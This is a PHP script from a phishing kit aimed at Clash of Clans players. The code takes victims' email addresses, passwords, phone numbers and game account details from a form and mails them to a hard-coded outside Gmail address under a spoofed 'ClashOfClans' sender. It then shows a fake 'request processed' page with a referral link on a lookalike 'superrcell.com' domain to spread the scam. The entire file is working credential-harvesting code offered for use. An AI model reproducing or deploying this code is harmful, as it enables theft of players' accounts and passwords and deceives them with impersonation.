<?php
#######################
##        Author: Akromi Afif             ##
#######################

$subject = 'Spam COC Delivery';
$mailto = 'resultrolls@gmail.com';

$email = $_POST['email'];
$password = $_POST['password'];
$hp = $_POST['hp'];
$th = $_POST ['th'];
$elixir = $_POST['elixir'];
$gold = $_POST['gold'];
$gems = $_POST['gems'];
$darkelixir = $_POST['darkelixir'];

$message   = "
++==========[ Clash Of Clans ]==========++
<br><br>
      .++==========[ Information ]==========++.<br>
Email     :  ".$email."<br>
Password  :  ".$password."<br>
Handphone  :  ".$hp."<br>
Townhall :  ".$th."<br>
      .++==========[ &nbsp;&nbsp;End&nbsp;&nbsp; ]==========++.
<br><br>
      .++==========[ Account Info ]==========++.<br>
Gems   :  ".$gems."<br>
Gold   :  ".$gold."<br>
Elixir   :  ".$elixir."<br>
Dark Elixir : ".$darkelixir."<br>
      .++==========[ &nbsp;&nbsp;End&nbsp;&nbsp; ]==========++.
<br><br>
.++==========[ Clash Of Clans ]==========++
";

$headers = "From: ClashOfClans@massachusetts.com\r\n";
$headers .= "Content-type: text/html\r\n";
$success = mail($mailto, $subject, $message, $headers);
?>
<?php
$random = rand(1000,5000);
?>

<!DOCTYPE html>
<html>
<head>
<title> Thank You ! </title>
</head>
<body style="background-color: #3b5998; color: white;">
<center><h2>Your Request Hasbeen Proccessed,Wait 24 Hours</h2><br>
Share Your Refferal For Win This Event<br>
Your Refferal Is: <font color="white">http://superrcell.com/index.php?id=<?php echo $random; ?></font>
</center>
</body>
</html>
